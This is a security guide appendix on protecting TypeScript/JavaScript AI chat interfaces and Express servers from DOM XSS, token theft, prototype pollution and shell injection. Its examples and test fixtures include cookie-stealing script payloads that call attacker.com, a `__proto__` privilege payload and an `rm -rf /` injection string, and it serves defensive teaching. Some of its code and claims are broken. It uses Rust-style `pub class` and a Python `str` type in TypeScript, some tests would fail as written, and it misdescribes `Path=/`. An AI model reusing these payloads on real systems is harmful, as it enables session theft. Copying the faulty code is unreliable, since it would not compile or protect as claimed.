# Appendix C: TypeScript and JavaScript for AI applications

> **Part:** Appendices
> **Market evidence:** TypeScript / JavaScript (12.6% core usage in frontend AI portals, chat interfaces, and Node.js orchestrators)
> **Reader status:** GAP (Addressing security vulnerabilities across dynamic web rendering and Node.js servers)
> **Why this appendix exists:** The boom of generative AI has led to an explosion of client-side application interfaces. Frontend dashboards, chat interfaces (such as chatbot sidecars), and orchestration layers (like LangChain.js or custom Express-based gateways) are predominantly built using TypeScript or JavaScript. At a Staff+ level, you must secure these applications against client-side exploitation. This appendix covers client-side and full-stack security, focusing on preventing DOM-based Cross-Site Scripting (XSS) from non-deterministic LLM markdown outputs, securing client-side tokens, formulating robust Content Security Policies, and shielding Express/Vite servers from Prototype Pollution and subprocess injections.

---

## 1. DOM XSS and Dynamic Output Rendering of LLM Generation

Generative AI applications are uniquely prone to Cross-Site Scripting (XSS). When an LLM generates markdown, it may include HTML or JavaScript formatting. If a frontend application takes this raw output and renders it directly inside the DOM (e.g., using React's `dangerouslySetInnerHTML`), any embedded script or malicious event handler will execute in the user's browser session.

```
┌─────────────────┐      Malicious Markdown      ┌──────────────────┐      Unsanitized HTML      ┌───────────────┐
│  Compromised    ├─────────────────────────────►│  React/Vite Chat ├───────────────────────────►│ DOM XSS in    │
│  LLM / Prompt   │  "Click [here](javascript:   │  Application     │  dangerouslySetInnerHTML   │ User Session  │
│  Injected Input │   alert(document.cookie))"   └──────────────────┘                            └───────────────┘
└─────────────────┘
```

### 1.1 The Vulnerability: Raw Markdown Compilation
Many popular markdown-to-HTML parsers compile raw markup directly, converting markdown syntax like `[Link](javascript:alert(1))` into `<a href="javascript:alert(1)">Link</a>`.

### 1.2 The Defense: Isomorphic-DOMPurify Sanitization
To prevent DOM XSS, you must pass all compiled HTML through a structural sanitizer before injecting it into the DOM. DOMPurify uses a fast, highly optimized browser-native parser (or a virtual DOM on the server) to strip out malicious tags (`<script>`, `<iframe>`, `<object>`) and dangerous attributes (`onload`, `onerror`, `href="javascript:"`).

```typescript
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeLlmOutput(rawHtml: string): string {
    return DOMPurify.sanitize(rawHtml, {
        ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'code', 'pre', 'ul', 'ol', 'li', 'h1', 'h2', 'h3'],
        ALLOWED_ATTR: ['href', 'target', 'rel', 'class'],
        // Explicitly force safe protocols on href links (prevents javascript: and data: URIs)
        ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|ftp):|[^a-z0-9+.-])/i,
        FORCE_BODY: true
    });
}
```

---

## 2. Secure Browser State Storage and Session Management

When managing user session states, JWT access tokens, or sensitive LLM API credentials in the browser, selecting the right storage mechanism dictates the blast radius of an XSS vulnerability.

| Storage Mechanism | Exfiltration Risk via XSS | CSRF Vulnerability | Practical Use Case |
| :--- | :--- | :--- | :--- |
| **`localStorage`** | **CRITICAL**. Any script executing in the page context can access `localStorage.getItem()` and steal tokens. | None (Requires explicit authorization header inclusion). | Non-sensitive UI layout preferences or offline state. |
| **`sessionStorage`** | **HIGH**. Accessible via any script within the specific browser tab. Cleared on tab close. | None. | Temporary, non-sensitive session cache. |
| **`HttpOnly` Cookie** | **ZERO**. The browser blocks JavaScript from reading the cookie via `document.cookie`. | **YES**. The browser automatically attaches cookies to outbound cross-site requests. | Sensitive session identifiers, refresh tokens, and authentication cookies. |

### 2.1 The HttpOnly Paved Path
To protect session tokens, implement standard-session tokens inside `HttpOnly` cookies hardened with the following directives:
-   `Secure`: Ensures the cookie is only transmitted over encrypted HTTPS connections.
-   `SameSite=Strict` or `SameSite=Lax`: Restricts cookie transmission during cross-site requests, mitigating CSRF attacks.
-   `Path=/`: Restricts cookie visibility to designated API endpoints to limit exposure.

---

## 3. Strict Content Security Policy (CSP) Configurations

A Content Security Policy (CSP) is an HTTP response header that acts as a powerful safety net against XSS. It restricts the origins from which the browser is allowed to load resources (scripts, styles, images) and prevents unauthorized outbound socket connections.

### 3.1 Strict Nonce-Based CSP Configuration Template
```http
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-rAnd0m12345' 'strict-dynamic'; 
  style-src 'self' 'unsafe-inline'; 
  connect-src 'self' https://api.openai.com https://api.anthropic.com; 
  img-src 'self' data: https://images.unsplash.com; 
  frame-ancestors 'none'; 
  object-src 'none'; 
  base-uri 'none'; 
  form-action 'self';
```

-   `script-src 'nonce-rAnd0m12345'`: Tells the browser to only execute scripts that possess a matching `nonce` attribute. Inline script injections will fail because the attacker cannot guess the cryptographic nonce generated per-request.
-   `connect-src`: Explicitly locks down outbound API requests. Even if an attacker achieves XSS and tries to exfiltrate data via `fetch('https://attacker.com')`, the browser blocks the connection because `attacker.com` is not in the whitelist.
-   `object-src 'none'`: Disables dangerous, legacy plugins like Flash or Silverlight.
-   `frame-ancestors 'none'`: Prevents clickjacking by blocking other domains from embedding the application inside an `<iframe>`.

---

## 4. Prototype Pollution Mitigation in Express and Vite Servers

JavaScript objects are dynamic bags of properties. Every object (unless created with `Object.create(null)`) inherits properties and methods from its prototype (`Object.prototype`). **Prototype Pollution** occurs when an attacker exploits unsafe recursive merges or property assignments to inject or overwrite properties on `Object.prototype`. Since all objects inherit from this prototype, the injection pollutes *every* object in the runtime, often leading to Remote Code Execution (RCE) or authorization bypasses.

```
              Attacker JSON: { "payload": { "__proto__": { "isAdmin": true } } }
                                          │
                                          ▼
                         Unsafe Recursive Object Merge
                                          │
                                          ▼
                    Object.prototype.isAdmin is set to true!
                                          │
                                          ▼
     Every object `{}` created subsequently now has `.isAdmin === true` by default.
```

### 4.1 Vulnerable Code Example
```typescript
// INSECURE: Deep merge vulnerable to prototype pollution
function merge(target: any, source: any) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]); // Recurses into __proto__
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

### 4.2 Secure Code Example
```typescript
// SECURE: Deep merge with strict prototype key filtering
export function safeMerge(target: any, source: any): any {
    for (let key in source) {
        // Strict boundary check: Block access to internal proto keys
        if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
            continue;
        }
        
        if (source[key] && typeof source[key] === 'object') {
            if (!target[key]) {
                target[key] = Array.isArray(source[key]) ? [] : {};
            }
            safeMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```

Alternatively, use `Object.create(null)` when creating clean map-like objects, which removes the prototype link entirely.

---

## 5. Secure Node.js Subprocess Isolation

When writing full-stack Node.js utilities (e.g., custom code executors or background scanners), running external shell binaries is common. You must strictly avoid `child_process.exec()`, which spawns a shell process behind the scenes, leaving you vulnerable to shell injection.

Instead, enforce the following constraints:
1.  **Use `execFile` or `spawn`:** These execute files directly without parsing shell special characters.
2.  **Explicit Argument Array:** Pass arguments as an array of strings.
3.  **Process Limits:** Configure strict limits on execution timeouts, maximum buffer size, and run as a non-privileged system user (using GID/UID options).

```typescript
import { execFile } from 'child_process';

export function runSystemDiagnostic(filePath: str, args: string[]): Promise<string> {
    return new Promise((resolve, reject) => {
        // execFile executes the file directly, preventing shell command chaining (e.g., file.txt; rm -rf /)
        execFile('/usr/bin/file', [filePath, ...args], {
            timeout: 2000,           // Strict execution limit: 2 seconds
            maxBuffer: 1024 * 1024,  // Limit stdout buffer to 1MB to prevent memory exhaustion DoS
            env: { PATH: '/usr/bin:/bin' }, // Strip environment variables
            uid: 1001,               // De-escalate privileges (non-root UID)
            gid: 1001
        }, (error, stdout, stderr) => {
            if (error) {
                return reject(error);
            }
            resolve(stdout);
        });
    });
}
```

---

## 6. Production Reference: Sanitized Pipeline and Express Gateway Middleware

Below is a complete, self-contained, typed, and production-grade TypeScript implementation of a secure full-stack rendering pipeline and server-side gateway. It consists of:
1.  **`MarkdownSanitizerPipeline`**: A robust client-side dynamic content processing engine that compiles markdown, strips invalid protocols, and leverages isomorphic sanitization to neutralize DOM XSS.
2.  **`SecureGatewayMiddleware`**: An Express.js middleware that acts as a secure reverse-proxy gatekeeper, executing:
    -   Strict dynamic CSP header generation containing unique cryptographic nonces.
    -   Deep request body validation to sanitize and block Prototype Pollution vectors.

```typescript
// src/secure_gateway.ts

import { Request, Response, NextFunction } from 'express';
import DOMPurify from 'isomorphic-dompurify';
import crypto from 'crypto';

// ============================================================================
// PART 1: Client-side Sanitized Dynamic Pipeline
// ============================================================================

export interface SanitizationResult {
    originalLength: number;
    sanitizedLength: number;
    sanitizedHtml: string;
    isClean: boolean;
}

/**
 * Handles compile-time and run-time sanitization of dynamic content generated by AI models.
 */
pub class MarkdownSanitizerPipeline {
    private static readonly AllowedTags = [
        'p', 'b', 'i', 'em', 'strong', 'a', 'code', 'pre', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'br', 'span'
    ];

    private static readonly AllowedAttributes = [
        'href', 'target', 'rel', 'class', 'id'
    ];

    /**
     * Sanitizes incoming dynamic HTML compiled from LLM Markdown sources.
     * Guaranteed to strip script blocks, event handlers, and dangerous iframe targets.
     */
    public static sanitizeHtml(rawHtml: string): SanitizationResult {
        if (!rawHtml) {
            return { originalLength: 0, sanitizedLength: 0, sanitizedHtml: '', isClean: true };
        }

        const config: DOMPurify.Config = {
            ALLOWED_TAGS: this.AllowedTags,
            ALLOWED_ATTR: this.AllowedAttributes,
            ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|ftp):|[^a-z0-9+.-])/i, // Prevent javascript: or data: injection
            FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form'],
            FORBID_ATTR: ['onload', 'onerror', 'onclick', 'onmouseover'],
            FORCE_BODY: true,
        };

        const sanitized = DOMPurify.sanitize(rawHtml, config) as string;

        return {
            originalLength: rawHtml.length,
            sanitizedLength: sanitized.length,
            sanitizedHtml: sanitized,
            isClean: rawHtml === sanitized
        };
    }
}

// ============================================================================
// PART 2: Server-side Security Gateway Middleware
// ============================================================================

/**
 * Custom request interface extending standard Express Request to carry session nonces.
 */
export interface SecureRequest extends Request {
    nonce?: string;
}

/**
 * Recursively inspects incoming JSON request bodies to block prototype pollution payloads.
 */
export function detectPrototypePollution(payload: any): boolean {
    if (!payload || typeof payload !== 'object') {
        return false;
    }

    for (const key in payload) {
        if (Object.prototype.hasOwnProperty.call(payload, key)) {
            // Block keys targeting the prototype chain
            if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
                return true;
            }

            // Recurse down nested objects/arrays
            if (typeof payload[key] === 'object' && payload[key] !== null) {
                if (detectPrototypePollution(payload[key])) {
                    return true;
                }
            }
        }
    }
    return false;
}

/**
 * Gatekeeper Middleware providing strict CSP header injects and request sanitization.
 */
pub class SecureGatewayMiddleware {
    /**
     * Express middleware to block prototype pollution on body, query, and params.
     */
    public static preventPrototypePollution(req: Request, res: Response, next: NextFunction): void {
        if (req.body && detectPrototypePollution(req.body)) {
            res.status(400).json({
                error: 'Security Error',
                message: 'Malicious payload detected: Prototype Pollution signature found.'
            });
            return;
        }

        if (req.query && detectPrototypePollution(req.query)) {
            res.status(400).json({
                error: 'Security Error',
                message: 'Malicious query parameters: Prototype Pollution signature found.'
            });
            return;
        }

        next();
    }

    /**
     * Express middleware to generate and inject unique CSP nonces.
     */
    public static injectContentSecurityPolicy(req: SecureRequest, res: Response, next: NextFunction): void {
        // Generate a cryptographically secure cryptoprimitive nonce per-request
        const nonce = crypto.randomBytes(16).toString('base64');
        req.nonce = nonce;

        // Apply strict CSP headers to mitigate XSS and clickjacking
        res.setHeader(
            'Content-Security-Policy',
            [
                "default-src 'self'",
                `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'`,
                "style-src 'self' 'unsafe-inline'",
                "connect-src 'self' https://api.openai.com https://api.anthropic.com",
                "img-src 'self' data: https:",
                "frame-ancestors 'none'",
                "object-src 'none'",
                "base-uri 'none'",
                "form-action 'self'",
            ].join('; ')
        );

        // Standard security headers
        res.setHeader('X-Frame-Options', 'DENY');
        res.setHeader('X-Content-Type-Options', 'nosniff');
        res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
        res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');

        next();
    }
}

// ============================================================================
// PART 3: Unit Validation Tests
// ============================================================================

import { expect } from 'chai';

describe('TypeScript Full-Stack Security Verification Harness', () => {
    describe('Client-side MarkdownSanitizerPipeline', () => {
        it('should neutralize raw DOM XSS injections inside links', () => {
            const unsafeHtml = '<p>Check out our <a href="javascript:alert(123)" onclick="stealCookies()">API documentation</a></p>';
            const result = MarkdownSanitizerPipeline.sanitizeHtml(unsafeHtml);
            
            expect(result.isClean).to.be.false;
            expect(result.sanitizedHtml).to.not.include('javascript:');
            expect(result.sanitizedHtml).to.not.include('onclick');
            expect(result.sanitizedHtml).to.include('<a>API documentation</a>');
        });

        it('should strip script blocks completely', () => {
            const unsafeHtml = '<div><h4>Report</h4><script>fetch("https://attacker.com?leak=" + document.cookie)</script></div>';
            const result = MarkdownSanitizerPipeline.sanitizeHtml(unsafeHtml);
            
            expect(result.sanitizedHtml).to.not.include('<script>');
            expect(result.sanitizedHtml).to.include('<h4>Report</h4>');
        });
    });

    describe('Server-side Prototype Pollution Detector', () => {
        it('should flag nested __proto__ mutations', () => {
            const maliciousPayload = {
                user: {
                    name: 'staff_dev',
                    settings: {
                        theme: 'dark'
                    }
                },
                __proto__: {
                    isAdmin: true
                }
            };

            const isVulnerable = detectPrototypePollution(maliciousPayload);
            expect(isVulnerable).to.be.true;
        });

        it('should allow clean payloads with no internal prototype references', () => {
            const cleanPayload = {
                user: {
                    name: 'staff_dev',
                    settings: {
                        theme: 'dark'
                    }
                }
            };

            const isVulnerable = detectPrototypePollution(cleanPayload);
            expect(isVulnerable).to.be.false;
        });
    });
});
```
